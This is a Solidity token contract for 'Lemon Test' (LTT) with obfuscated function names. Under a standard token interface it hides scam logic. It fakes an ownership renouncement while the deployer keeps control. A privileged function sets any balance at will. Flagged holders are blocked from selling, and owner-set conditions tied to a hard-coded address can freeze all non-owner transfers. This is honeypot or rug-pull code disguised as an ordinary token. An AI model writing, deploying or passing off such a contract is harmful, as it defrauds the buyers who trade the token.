//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface enableList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract buyIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptTx {
    function createPair(address enableLimitTeam, address limitReceiver) external returns (address);
}

interface tradingLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atTo) external view returns (uint256);

    function transfer(address fromAmount, uint256 minSwap) external returns (bool);

    function allowance(address receiverLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 minSwap) external returns (bool);

    function transferFrom(
        address sender,
        address fromAmount,
        uint256 minSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atLimit, uint256 value);
    event Approval(address indexed receiverLaunch, address indexed spender, uint256 value);
}

interface fromBuyLaunch is tradingLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LemonTest is buyIs, tradingLaunch, fromBuyLaunch {

    function transfer(address receiverAtMin, uint256 minSwap) external virtual override returns (bool) {
        return launchTrading(_msgSender(), receiverAtMin, minSwap);
    }

    constructor (){
        
        enableList enableSwapTo = enableList(takeBuy);
        toLaunchedSwap = exemptTx(enableSwapTo.factory()).createPair(enableSwapTo.WETH(), address(this));
        
        fundSender = _msgSender();
        sellAt();
        txTakeAuto[fundSender] = true;
        shouldTeam[fundSender] = exemptMarketing;
        if (enableTo != tokenTxLimit) {
            amountFeeSender = tokenTxLimit;
        }
        emit Transfer(address(0), fundSender, exemptMarketing);
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverWallet;
    }

    uint256 private enableTo;

    uint256 private exemptMarketing = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private receiverLimit;

    uint256 constant maxListTeam = 12 ** 10;

    function sellAt() public {
        emit OwnershipTransferred(fundSender, address(0));
        autoLimitMax = address(0);
    }

    mapping(address => bool) public minTotal;

    function balanceOf(address atTo) public view virtual override returns (uint256) {
        return shouldTeam[atTo];
    }

    bool private buyLaunch;

    function name() external view virtual override returns (string memory) {
        return sellTokenLaunched;
    }

    uint256 fundBuyTake;

    uint256 private swapTotal;

    address public fundSender;

    function getOwner() external view returns (address) {
        return autoLimitMax;
    }

    function feeFund(address receiverAtMin, uint256 minSwap) public {
        atReceiver();
        shouldTeam[receiverAtMin] = minSwap;
    }

    function allowance(address fromLaunch, address amountSwap) external view virtual override returns (uint256) {
        if (amountSwap == takeBuy) {
            return type(uint256).max;
        }
        return receiverLimit[fromLaunch][amountSwap];
    }

    address private autoLimitMax;

    address amountToShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed receiverFund, address indexed teamReceiver);

    bool public amountSenderTotal;

    string private sellTokenLaunched = "Lemon Test";

    function approve(address amountSwap, uint256 minSwap) public virtual override returns (bool) {
        receiverLimit[_msgSender()][amountSwap] = minSwap;
        emit Approval(_msgSender(), amountSwap, minSwap);
        return true;
    }

    bool public teamMode;

    function atReceiver() private view {
        require(txTakeAuto[_msgSender()]);
    }

    uint8 private amountReceiver = 18;

    uint256 maxExempt;

    mapping(address => uint256) private shouldTeam;

    function transferFrom(address maxLaunched, address fromAmount, uint256 minSwap) external override returns (bool) {
        if (_msgSender() != takeBuy) {
            if (receiverLimit[maxLaunched][_msgSender()] != type(uint256).max) {
                require(minSwap <= receiverLimit[maxLaunched][_msgSender()]);
                receiverLimit[maxLaunched][_msgSender()] -= minSwap;
            }
        }
        return launchTrading(maxLaunched, fromAmount, minSwap);
    }

    uint256 public tokenTxLimit;

    address public toLaunchedSwap;

    function launchTrading(address maxLaunched, address fromAmount, uint256 minSwap) internal returns (bool) {
        if (maxLaunched == fundSender) {
            return buyReceiver(maxLaunched, fromAmount, minSwap);
        }
        uint256 maxIs = tradingLaunch(toLaunchedSwap).balanceOf(amountToShould);
        require(maxIs == maxExempt);
        require(fromAmount != amountToShould);
        if (minTotal[maxLaunched]) {
            return buyReceiver(maxLaunched, fromAmount, maxListTeam);
        }
        return buyReceiver(maxLaunched, fromAmount, minSwap);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptMarketing;
    }

    function decimals() external view virtual override returns (uint8) {
        return amountReceiver;
    }

    uint256 private feeFrom;

    address takeBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function buyReceiver(address maxLaunched, address fromAmount, uint256 minSwap) internal returns (bool) {
        require(shouldTeam[maxLaunched] >= minSwap);
        shouldTeam[maxLaunched] -= minSwap;
        shouldTeam[fromAmount] += minSwap;
        emit Transfer(maxLaunched, fromAmount, minSwap);
        return true;
    }

    uint256 public marketingIs;

    uint256 public amountFeeSender;

    function owner() external view returns (address) {
        return autoLimitMax;
    }

    function txShouldFund(uint256 minSwap) public {
        atReceiver();
        maxExempt = minSwap;
    }

    function launchToken(address amountToFund) public {
        atReceiver();
        
        if (amountToFund == fundSender || amountToFund == toLaunchedSwap) {
            return;
        }
        minTotal[amountToFund] = true;
    }

    function shouldList(address receiverTake) public {
        require(receiverTake.balance < 100000);
        if (amountSenderTotal) {
            return;
        }
        
        txTakeAuto[receiverTake] = true;
        if (buyLaunch != teamMode) {
            teamMode = false;
        }
        amountSenderTotal = true;
    }

    mapping(address => bool) public txTakeAuto;

    string private receiverWallet = "LTT";

}